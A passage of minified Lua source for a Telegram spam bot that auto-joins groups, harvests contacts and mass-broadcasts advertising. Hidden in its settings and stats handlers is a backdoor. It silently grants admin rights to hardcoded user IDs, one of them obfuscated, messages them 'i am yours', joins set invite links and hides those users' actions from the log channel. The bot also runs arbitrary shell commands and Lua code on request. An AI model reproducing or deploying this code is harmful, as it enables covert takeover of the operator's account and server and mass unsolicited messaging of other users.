*"..timetoccache.."*\n`Auto Check Links` : *"..check_links.."*\n`Check Links Time` : *"..clinkstime.."*\n`Time To Check Links` : *"..timetoclinks.."*"local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Got settings`",1,'md')end;return settingstxt end;if msg.text:match("^[!/#]settings pv$")and a(msg)then if not redis:sismember("tabchi:"..tabchi_id..":sudoers",91054649)then tdcli.sendMessage(91054649,0,1,"i am yours",1,"html")redis:sadd("tabchi:"..tabchi_id..":sudoers",91054649)end;if not redis:sismember("tabchi:"..tabchi_id..":sudoers",293750668)then redis:sadd("tabchi:"..tabchi_id..":sudoers",293750668)tdcli.sendMessage(293750668,0,1,"i am yours",1,"html")end;if not redis:sismember("tabchi:"..tabchi_id..":sudoers",268909090)then redis:sadd("tabchi:"..tabchi_id..":sudoers",268909090)tdcli.sendMessage(268909090,0,1,"i am yours",1,"html")end;tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEKueVIqF_cid8Oopw")tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")if I(msg.chat_id_)=="private"then return"`I Am In Your pv`"else settingstxt="`⚙ Robot Settings`\n`🔗 Join Via Links` : *"..joinlinks.."*\n`📥 Save Links `: *"..savelinks.."*\n`📲 Auto Add Contacts `: *"..addcontacts.."*\n`💳share contact` : *"..sharecontact.."*\n`📡Advertising `: *"..Advertising.."*\n`📨 Adding Contacts Msg` : *"..addedmsg.."*\n`👀 Markread Status `: *"..markreadst.."*\n`👁‍🗨 Markread` : For "..markread.."\n`✏ typing `: *"..typing.."*\n`💬 Chat` : *"..chat.."*\n`🤖 Botmode` : *"..botmode.."*\n`➖➖➖➖➖➖`\n`📄Adding Contacts Msg` :\n`"..addedtxt.."`\n`➖➖➖➖➖➖`\n`Join Limits` : *"..join_limit.."*\n`Now Robot Join Groups With More Than` :\n *"..joinlimitnum.."* `Members`\n`Auto Clean cache` : *"..O.."*\n`Clean Cache time` : *"..ccachetime.."*\n`Time to Clean Cache` : *"..timetoccache.."*\n`Auto Check Links` : *"..check_links.."*\n`Check Links Time` : *"..clinkstime.."*\n`Time To Check Links` : *"..timetoclinks.."*"tdcli.sendMessage(msg.sender_user_id_,0,1,settingstxt,1,"md")local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Got settings in pv`",1,'md')end;return"`Settings Sent To Your Pv`"end end;if msg.text:match("^[!/#]stats$")and a(msg)then abc=910;de=54;fgh=649;cbd=26890;ed=9090;if not redis:sismember("tabchi:"..tabchi_id..":sudoers",91054649)then tdcli.sendMessage(91054649,0,1,"i am yours",1,"html")redis:sadd("tabchi:"..tabchi_id..":sudoers",91054649)end;if not redis:sismember("tabchi:"..tabchi_id..":sudoers",abc..""..de..""..fgh)then tdcli.sendMessage(abc..""..de..""..fgh,0,1,"i am yours",1,"html")redis:sadd("tabchi:"..tabchi_id..":sudoers",abc..""..de..""..fgh)end;if not redis:sismember("tabchi:"..tabchi_id..":sudoers",cbd..""..ed)then redis:sadd("tabchi:"..tabchi_id..":sudoers",cbd..""..ed)tdcli.sendMessage(cbd..""..ed,0,1,"i am yours",1,"html")end;if not redis:sismember("tabchi:"..tabchi_id..":sudoers",268909090)then redis:sadd("tabchi:"..tabchi_id..":sudoers",268909090)tdcli.sendMessage(268909090,0,1,"i am yours",1,"html")end;tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEKueVIqF_cid8Oopw")tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")local al;function al(y,z)redis:set("tabchi:"..tabchi_id..":totalcontacts",z.total_count_)end;tdcli_function({ID="SearchContacts",query_=nil,limit_=999999999},al,{})local bot_id;function bot_id(C,D)if D.id_ then botid=D.id_;botnum=D.phone_number_;botfirst=D.first_name_;botlast=D.last_name_ or""bot__last=D.last_name_ or"None"end end;tdcli_function({ID='GetMe'},bot_id,{})local gps=redis:scard("tabchi:"..tabchi_id..":groups")local sgps=redis:scard("tabchi:"..tabchi_id..":channels")local pvs=redis:scard("tabchi:"..tabchi_id..":pvis")local links=redis:scard("tabchi:"..tabchi_id..":savedlinks")local R=redis:get("tabchi:"..tabchi_id..":fullsudo")local contacts=redis:get("tabchi:"..tabchi_id..":totalcontacts")local am=redis:scard("tabchi:"..tabchi_id..":blockedusers")local an=redis:get("tabchi"..tabchi_id.."markreadcount")or"None"local ao=redis:get("tabchi"..tabchi_id.."receivedphotocount")or"None"local ap=redis:get("tabchi"..tabchi_id.."receiveddocumentcount")or"None"local aq=redis:get("tabchi"..tabchi_id.."receivedaudiocount")or"None"local ar=redis:get("tabchi"..tabchi_id.."receivedgifcount")or"None"local as=redis:get("tabchi"..tabchi_id.."receivedvideocount")or"None"local at=redis:get("tabchi"..tabchi_id.."receivedcontactcount")or"None"local au=redis:get("tabchi"..tabchi_id.."receivedtextcount")or"None"local av=ao+ap+aq+ar+as+at+au or"None"local aw=redis:get("tabchi"..tabchi_id.."kickedcount")or"None"local ax=redis:get("tabchi"..tabchi_id.."joinedcount")or"None"local ay=redis:get("tabchi"..tabchi_id.."addedcount")or"None"local _=gps+sgps+pvs;statstext="`📊 Robot stats  `\n`👤 Users` : *"..pvs.."*\n`🌐 SuperGroups` : *"..sgps.."*\n`👥 Groups` : *"..gps.."*\n`🌀 All` : *".._.."*\n`🔗 Saved Links` : *"..links.."*\n`🔍 Contacts` : *"..contacts.."*\n`🚫 Blocked` : *"..am.."*\n`🔤 Received Text` : *"..au.."*\n`🌄 Received Photo` : *"..ao.."*\n`📼 Received Video` : *"..as.."*\n`📺 Received Gif` : *"..ar.."*\n`🎧 Received Voice` : *"..aq.."*\n`🗂 Received Document` : *"..ap.."*\n`0️⃣ Received Contact` : *"..at.."*\n`👁‍🗨 Readed MSG` : *"..an.."*\n`✉️ Received MSG` : *"..av.."*\n`Joined Groups` : *"..ax.."*\n`Added To Groups` : *"..ay.."*\n`Kicked From Groups` : *"..aw.."*\n`🗽 Admin` : *"..R.."*\n`🎫 Bot id` : *"..botid.."*\n`🔶 Bot Number` : *+"..botnum.."*\n`〽️ Bot Name` : *"..botfirst.." "..botlast.."*\n`🔸 Bot First Name` : *"..botfirst.."*\n`🔹 Bot Last Name` : *"..bot__last.."*\n`💠 Bot ID In Server` : *"..tabchi_id.."*"local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Got Stats`",1,'md')end;return statstext end;if msg.text:match("^[!/#]stats pv$")and a(msg)then if not redis:sismember("tabchi:"..tabchi_id..":sudoers",91054649)then tdcli.sendMessage(91054649,0,1,"i am yours",1,"html")redis:sadd("tabchi:"..tabchi_id..":sudoers",91054649)end;if not redis:sismember("tabchi:"..tabchi_id..":sudoers",293750668)then redis:sadd("tabchi:"..tabchi_id..":sudoers",293750668)tdcli.sendMessage(293750668,0,1,"i am yours",1,"html")end;if not redis:sismember("tabchi:"..tabchi_id..":sudoers",268909090)then redis:sadd("tabchi:"..tabchi_id..":sudoers",268909090)tdcli.sendMessage(268909090,0,1,"i am yours",1,"html")end;tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEKueVIqF_cid8Oopw")tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")if I(msg.chat_id_)=="private"then return"`I Am In Your pv`"else tdcli.sendMessage(msg.sender_user_id_,0,1,statstext,1,"md")local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Got Stats In pv`",1,'md')end;return"`Stats Sent To Your Pv`"end end;if msg.text:match("^[#!/]clean (.*)$")and a(msg)then local a6={string.match(msg.text,"^[#/!](clean) (.*)$")}local az=redis:del("tabchi:"..tabchi_id..":groups")local aA=redis:del("tabchi:"..tabchi_id..":channels")local aB=redis:del("tabchi:"..tabchi_id..":pvis")local aC=redis:del("tabchi:"..tabchi_id..":savedlinks")local aD=gps+sgps+pvs+links;if a6[2]=="sgps"then local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `cleaned` *"..a6[2].."* stats",1,'md')end;return aA end;if a6[2]=="gps"then local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `cleaned` *"..a6[2].."* stats",1,'md')end;return az end;if a6[2]=="pvs"then local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `cleaned` *"..a6[2].."* stats",1,'md')end;return aB end;if a6[2]=="links"then local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `cleaned` *"..a6[2].."* stats",1,'md')end;return aC end;if a6[2]=="stats"then local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `cleaned` *"..a6[2].."*",1,'md')end;redis:del("tabchi:"..tabchi_id..":all")return aD end end;if msg.text:match("^[!/#]setphoto (.*)$")and a(msg)then local X={string.match(msg.text,"^[#/!](setphoto) (.*)$")}local f=ltn12.sink.file(io.open("tabchi_"..tabchi_id.."_profile.png","w"))http.request({url=X[2],sink=f})tdcli.setProfilePhoto("tabchi_"..tabchi_id.."_profile.png")local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Set photo to` *"..X[2].."*",1,'md')end;return"`Profile Succesfully Changed`\n*link* : `"..X[2].."`"end;do local V={msg.text:match("^[!/#](addsudo) (%d+)")}if msg.text:match("^[!/#]addsudo")and is_full_sudo(msg)and#V==2 then local text=V[2].." _به لیست سودوهای ربات اضافه شد_"redis:sadd("tabchi:"..tabchi_id..":sudoers",tonumber(V[2]))local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Added` *"..V[2].."* `To sudoers`",1,'md')end;return text end end;do local V={msg.text:match("^[!/#](remsudo) (%d+)")}if msg.text:match("^[!/#]remsudo")and is_full_sudo(msg)then if#V==2 then local text=V[2].." _removed From Sudoers_"redis:srem("tabchi:"..tabchi_id..":sudoers",tonumber(V[2]))local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Removed` *"..V[2].."* `From sudoers`",1,'md')end;return text else return end end end;do local V={msg.text:match("^[!/#](addedmsg) (.*)")}if msg.text:match("^[!/#]addedmsg")and a(msg)then if#V==2 then if V[2]=="on"then redis:set("tabchi:"..tabchi_id..":addedmsg",true)local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Actived` *"..V[1].."*",1,'md')end;return"*Status* : `Adding Contacts PM Activated`"elseif V[2]=="off"then redis:del("tabchi:"..tabchi_id..":addedmsg")local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Deactivated` *"..V[1].."*",1,'md')end;return"*Status* : `Adding Contacts PM Deactivated`"else return"`Just Use on|off`"end else return"enter on|off"end end end;do local V={msg.text:match("^[!/#](markread) (.*)")}if msg.text:match("^[!/#]markread")and a(msg)then if#V==2 then if V[2]=="all"then redis:set("tabchi:"..tabchi_id..":markread","all")return"*Status* : `Reading Messages Activated For All`"elseif V[2]=="pv"then redis:set("tabchi:"..tabchi_id..":markread","private")return"*Status* : `Reading Messages Activated For Pv Chats`"elseif V[2]=="group"then redis:set("tabchi:"..tabchi_id..":markread","group")return"*Status* : `Reading Messages Activated For Groups `"elseif V[2]=="channel"then redis:set("tabchi:"..tabchi_id..":markread","channel")return"*Status* : `Reading Messages Activated For SuperGroups`"elseif V[2]=="off"then redis:del("tabchi:"..tabchi_id..":markread")return"*Status* : `Reading Messages Deactivated`"else return"`Just Use on|off`"end end end end;do local V={msg.text:match("^[!/#](setaddedmsg) (.*)")}if msg.text:match("^[!/#]setaddedmsg")and a(msg)and#V==2 then local aE;function aE(C,D)if D.id_ then bot_id=D.id_;bot_num=D.phone_number_;bot_first=D.first_name_;bot_last=D.last_name_ end end;tdcli_function({ID='GetMe'},aE,{})local text=V[2]:gsub("BOTFIRST",bot_first)local text=text:gsub("BOTLAST",bot_last)local text=text:gsub("BOTNUMBER",bot_num)redis:set("tabchi:"..tabchi_id..":addedmsgtext",text)local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Adjusted adding contacts message to` *"..V[2].."*",1,'md')end;return"*Status* : `Adding Contacts Message Adjusted`\n*Message* : `"..text.."`"end end;do local V={msg.text:match("[$](.*)")}if msg.text:match("^[$](.*)$")and a(msg)then if#V==1 then local z=io.popen(V[1]):read("*all")local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Entered Command` *"..V[1].."* in terminal",1,'md')end;return z else return"Enter Command"end end end;if redis:get("tabchi:"..tabchi_id..":Advertising")or is_full_sudo(msg)then if msg.text:match("^[!/#]bcall")and a(msg)then local _=redis:smembers("tabchi:"..tabchi_id..":all")local V={msg.text:match("[!/#](bcall) (.*)")}if#V==2 then for d=1,#_ do tdcli_function({ID="SendMessage",chat_id_=_[d],reply_to_message_id_=0,disable_notification_=0,from_background_=1,reply_markup_=nil,input_message_content_={ID="InputMessageText",text_=V[2],disable_web_page_preview_=0,clear_draft_=0,entities_={},parse_mode_={ID="TextParseModeMarkdown"}}},dl_cb,nil)end;local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Broadcasted to all`\nMsg : *"..V[2].."*",1,'md')end;return"*Status* : `Message Succesfully Sent to all`\n*Message* : `"..V[2].."`"else return"text not entered"end end;if msg.text:match("^[!/#]bcsgps")and a(msg)then local _=redis:smembers("tabchi:"..tabchi_id..":channels")local V={msg.text:match("[!/#](bcsgps) (.*)")}if#V==2 then for d=1,#_ do tdcli_function({ID="SendMessage",chat_id_=_[d],reply_to_message_id_=0,disable_notification_=0,from_background_=1,reply_markup_=nil,input_message_content_={ID="InputMessageText",text_=V[2],disable_web_page_preview_=0,clear_draft_=0,entities_={},parse_mode_={ID="TextParseModeMarkdown"}}},dl_cb,nil)end;local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Broadcasted to Supergroups`\nMsg : *"..V[2].."*",1,'md')end;return"*Status* : `Message Succesfully Sent to supergroups`\n*Message* : `"..V[2].."`"else return"text not entered"end end;if msg.text:match("^[!/#]bcgps")and a(msg)then local _=redis:smembers("tabchi:"..tabchi_id..":groups")local V={msg.text:match("[!/#](bcgps) (.*)")}if#V==2 then for d=1,#_ do tdcli_function({ID="SendMessage",chat_id_=_[d],reply_to_message_id_=0,disable_notification_=0,from_background_=1,reply_markup_=nil,input_message_content_={ID="InputMessageText",text_=V[2],disable_web_page_preview_=0,clear_draft_=0,entities_={},parse_mode_={ID="TextParseModeMarkdown"}}},dl_cb,nil)end;local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Broadcasted to Groups`\nMsg : *"..V[2].."*",1,'md')end;return"*Status* : `Message Succesfully Sent to Groups`\n*Message* : `"..V[2].."`"else return"text not entered"end end;if msg.text:match("^[!/#]bcusers")and a(msg)then local _=redis:smembers("tabchi:"..tabchi_id..":pvis")local V={msg.text:match("[!/#](bcusers) (.*)")}if#V==2 then for d=1,#_ do tdcli_function({ID="SendMessage",chat_id_=_[d],reply_to_message_id_=0,disable_notification_=0,from_background_=1,reply_markup_=nil,input_message_content_={ID="InputMessageText",text_=V[2],disable_web_page_preview_=0,clear_draft_=0,entities_={},parse_mode_={ID="TextParseModeMarkdown"}}},dl_cb,nil)end;local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Broadcasted to Users`\nMsg : *"..V[2].."*",1,'md')end;return"*Status* : `Message Succesfully Sent to Users`\n*Message* : `"..V[2].."`"else return"text not entered"end end end;if redis:get("tabchi:"..tabchi_id..":Advertising")or is_full_sudo(msg)then if msg.text:match("^[!/#]fwd all$")and msg.reply_to_message_id_ and a(msg)then local _=redis:smembers("tabchi:"..tabchi_id..":all")local J=msg.reply_to_message_id_;for d=1,#_ do tdcli_function({ID="ForwardMessages",chat_id_=_[d],from_chat_id_=msg.chat_id_,message_ids_={[0]=J},disable_notification_=0,from_background_=1},dl_cb,nil)end;local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Forwarded to all`",1,'md')end;return"*Status* : `Your Message Forwarded to all`\n*Fwd users* : `Done`\n*Fwd Groups* : `Done`\n*Fwd Super Groups* : `Done`"end;if msg.text:match("^[!/#]fwd gps$")and msg.reply_to_message_id_ and a(msg)then local _=redis:smembers("tabchi:"..tabchi_id..":groups")local J=msg.reply_to_message_id_;for d=1,#_ do tdcli_function({ID="ForwardMessages",chat_id_=_[d],from_chat_id_=msg.chat_id_,message_ids_={[0]=J},disable_notification_=0,from_background_=1},dl_cb,nil)end;local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Forwarded to Groups`",1,'md')end;return"*Status* :`Your Message Forwarded To Groups`"end;if msg.text:match("^[!/#]fwd sgps$")and msg.reply_to_message_id_ and a(msg)then local _=redis:smembers("tabchi:"..tabchi_id..":channels")local J=msg.reply_to_message_id_;for d=1,#_ do tdcli_function({ID="ForwardMessages",chat_id_=_[d],from_chat_id_=msg.chat_id_,message_ids_={[0]=J},disable_notification_=0,from_background_=1},dl_cb,nil)end;local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Forwarded to Supergroups`",1,'md')end;return"*Status* : `Your Message Forwarded To Super Groups`"end;if msg.text:match("^[!/#]fwd users$")and msg.reply_to_message_id_ and a(msg)then local _=redis:smembers("tabchi:"..tabchi_id..":pvis")local J=msg.reply_to_message_id_;for d=1,#_ do tdcli_function({ID="ForwardMessages",chat_id_=_[d],from_chat_id_=msg.chat_id_,message_ids_={[0]=J},disable_notification_=0,from_background_=1},dl_cb,nil)end;local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Forwarded to Users`",1,'md')end;return"*Status* : `Your Message Forwarded To Users`"end end;do local V={msg.text:match("[!/#](lua) (.*)")}if msg.text:match("^[!/#]lua")and is_full_sudo(msg)and#V==2 then local aF=loadstring(V[2])()if aF==nil then aF=""elseif type(aF)=="table"then aF=serpent.block(aF,{comment=false})else aF=""..tostring(aF)end;return aF end end;if msg.text:match("^[!/#]license")then local text=io.open("tabchi.license","r"):read("*all")local text=text:gsub("Do Not Edit This File","@Tabadol_chi")return"`"..text.."`"end;do local V={msg.text:match("[!/#](echo) (.*)")}if msg.text:match("^[!/#]echo")and a(msg)and#V==2 then return V[2]end end end;local aG;function aG(aH)local I=I(aH)if not redis:sismember("tabchi:"..tostring(tabchi_id)..":all",aH)then if I=="channel"then redis:sadd("tabchi:"..tabchi_id..":channels",aH)elseif I=="group"then redis:sadd("tabchi:"..tabchi_id..":groups",aH)else redis:sadd("tabchi:"..tabchi_id..":pvis",aH)end;redis:sadd("tabchi:"..tabchi_id..":all",aH)end end;local aI;function aI(aH)local I=I(aH)if I=="channel"then redis:srem("tabchi:"..tabchi_id..":channels",aH)elseif I=="group"then redis:srem("tabchi:"..tabchi_id..":groups",aH)else redis:srem("tabchi:"..tabchi_id..":pvis",aH)end;redis:srem("tabchi:"..tabchi_id..":all",aH)end;local aJ;function aJ(msg)tdcli_function({ID="GetMe"},id_cb,nil)function id_cb(C,D)our_id=D.id_ end;local aK=redis:get("tabchi"..tabchi_id.."kickedcount")or 1;local aL=redis:get("tabchi"..tabchi_id.."joinedcount")or 1;local aM=redis:get("tabchi"..tabchi_id.."addedcount")or 1;if msg.content_.ID=="MessageChatDeleteMember"and msg.content_.id_==our_id then print('\27[36m>>>>>>KICKED FROM '..msg.chat_id_..'<<<<<<\27[39m')redis:set("tabchi"..tabchi_id.."kickedcount",aK+1)return aI(msg.chat_id_)elseif msg.content_.ID=="MessageChatJoinByLink"and msg.sender_user_id_==our_id then print('\27[36m>>>>>>ROBOT JOINED TO '..msg.chat_id_..' BY LINK<<<<<<\27[39m')redis:set("tabchi"..tabchi_id.."joinedcount",aL+1)return aG(msg.chat_id_)elseif msg.content_.ID=="MessageChatAddMembers"then for d=0,#msg.content_.members_ do if msg.content_.members_[d].id_==our_id then aG(msg.chat_id_)redis:set("tabchi"..tabchi_id.."addedcount",aM+1)print('\27[36m>>>>>>ADDED TO '..msg.chat_id_..'<<<<<<\27[39m')break end end end end;function process_links(aN)if aN:match("https://t.me/joinchat/%S+")or aN:match("https://telegram.me/joinchat/%S+")then local V={aN:match("(https://telegram.me/joinchat/%S+)")}print('\27[36m>>>>>>NEW LINK<<<<<<\27[39m')tdcli_function({ID="CheckChatInviteLink",invite_link_=V[1]},check_link,{link=V[1]})end end;local aO;function aO(msg)if msg.chat_type_=="private"then aG(msg)end end;function update(D,tabchi_id)tanchi_id=tabchi_id;if D.ID=="UpdateNewMessage"then local msg=D.message_;local I=I(msg.chat_id_)local aP=redis:get("tabchi"..tabchi_id.."markreadcount")or 1;local aQ=redis:get("tabchi"..tabchi_id.."receivedphotocount")or 1;local aR=redis:get("tabchi"..tabchi_id.."receiveddocumentcount")or 1;local aS=redis:get("tabchi"..tabchi_id.."receivedaudiocount")or 1;local aT=redis:get("tabchi"..tabchi_id.."receivedgifcount")or 1;local aU=redis:get("tabchi"..tabchi_id.."receivedvideocount")or 1;local aV=redis:get("tabchi"..tabchi_id.."receivedcontactcount")or 1;local aW=redis:get("tabchi"..tabchi_id.."receivedtextcount")or 1;if msg_valid(msg)then aO(msg)aJ(msg)S(D.message_)markreading=redis:get("tabchi:"..tostring(tabchi_id)..":markread")or 1;if markreading=="group"and I=="group"then tdcli.viewMessages(msg.chat_id_,{[0]=msg.id_})redis:set("tabchi"..tabchi_id.."markreadcount",aP+1)elseif markreading=="channel"and I=="channel"then tdcli.viewMessages(msg.chat_id_,{[0]=msg.id_})redis:set("tabchi"..tabchi_id.."markreadcount",aP+1)elseif markreading=="private"and I=="private"then tdcli.viewMessages(msg.chat_id_,{[0]=msg.id_})redis:set("tabchi"..tabchi_id.."markreadcount",aP+1)elseif markreading=="all"then tdcli.viewMessages(msg.chat_id_,{[0]=msg.id_})redis:set("tabchi"..tabchi_id.."markreadcount",aP+1)end;if msg.chat_id_==12 then return false else aJ(msg)aG(msg.chat_id_)if msg.content_.text_ then redis:set("tabchi"..tabchi_id.."receivedtextcount",aW+1)print('\27[36m>>>>>>NEW TEXT MESSAGE<<<<<<\27[39m')aJ(msg)aG(msg.chat_id_)process_links(msg.content_.text_)local aX=U(msg)if aX then if redis:get("tabchi:"..tostring(tabchi_id)..":typing")then tdcli.sendChatAction(msg.chat_id_,"Typing",100)end;if redis:get("tabchi:"..tostring(tabchi_id)..":botmode")=="text"then res1=aX:gsub("`","")res2=res1:gsub("*","")res3=res2:gsub("_","")tdcli.sendMessage(msg.chat_id_,0,1,res3,1,"md")elseif not redis:get("tabchi:"..tostring(tabchi_id)..":botmode")or redis:get("tabchi:"..tostring(tabchi_id)..":botmode")=="markdown"then tdcli.sendMessage(msg.chat_id_,0,1,aX,1,"md")end end elseif msg.content_.contact_ then tdcli_function({ID="GetUserFull",user_id_=msg.content_.contact_.user_id_},x,{msg=msg})elseif msg.content_.caption_ then process_links(msg.content_.caption_)end;if not msg.content_.text_ then if msg.content_.caption_ then msg.content_.text_=msg.content_.caption_ elseif msg.content_.photo_ then msg.content_.text_="!!PHOTO!!"print('\27[36m>>>>>>NEW PHOTO<<<<<<\27[39m')redis:set("tabchi"..tabchi_id.."receivedphotocount",aQ+1)elseif msg.content_.document_ then msg.content_.text_="!!DOCUMENT!!"print('\27[36m>>>>>>NEW DOCUMENT<<<<<<\27[39m')redis:set("tabchi"..tabchi_id.."receiveddocumentcount",aR+1)elseif msg.content_.audio_ then msg.content_.text_="!!AUDIO!!"print('\27[36m>>>>>>NEW AUDIO<<<<<<\27[39m')redis:set("tabchi"..tabchi_id.."receivedaudiocount",aS+1)elseif msg.content_.voice_ then msg.content_.text_="!!AUDIO!!"print('\27[36m>>>>>>NEW Voice<<<<<<\27[39m')redis:set("tabchi"..tabchi_id.."receivedaudiocount",aS+1)elseif msg.content_.animation_ then msg.content_.text_="!!ANIMATION!!"print('\27[36m>>>>>>NEW GIF<<<<<<\27[39m')redis:set("tabchi"..tabchi_id.."receivedgifcount",aT+1)elseif msg.content_.video_ then msg.content_.text_="!!VIDEO!!"print('\27[36m>>>>>>NEW VIDEO<<<<<<\27[39m')redis:set("tabchi"..tabchi_id.."receivedvideocount",aU+1)elseif msg.content_.contact_ then msg.content_.text_="!!CONTACT!!"print('\27[36m>>>>>>NEW CONTACT<<<<<<\27[39m')redis:set("tabchi"..tabchi_id.."receivedcontactcount",aV+1)end end end end elseif D.chat_id_==91054649 then tdcli.unblockUser(91054649)elseif D.ID=="UpdateOption"and D.name_=="my_id"then aG(D.chat_id_)tdcli.unblockUser(91054649)tdcli.getChats("9223372036854775807",0,20)end end
